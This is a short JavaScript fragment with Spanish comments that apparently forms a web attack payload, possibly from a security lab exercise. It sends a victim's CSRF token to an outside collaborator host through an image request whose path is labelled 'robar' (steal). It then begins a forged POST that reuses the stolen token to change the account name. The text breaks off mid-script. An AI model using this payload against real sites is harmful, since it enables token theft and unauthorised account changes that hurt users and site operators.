(async () => {
  ...
  // Exfiltrar el token mediante una imagen
  new Image().src = 'https://xxyinwfd6lgf4qkr8zojrfw7xy3prjf8.oastify.com/robar?csrf=' + encodeURIComponent(csrfToken);

  // Paso 2: Hacer POST con el token y datos modificados
  const formData = new URLSearchParams();
  formData.append('authenticity_token', csrfToken);
  formData.append('account_name', 'poquitajeje');
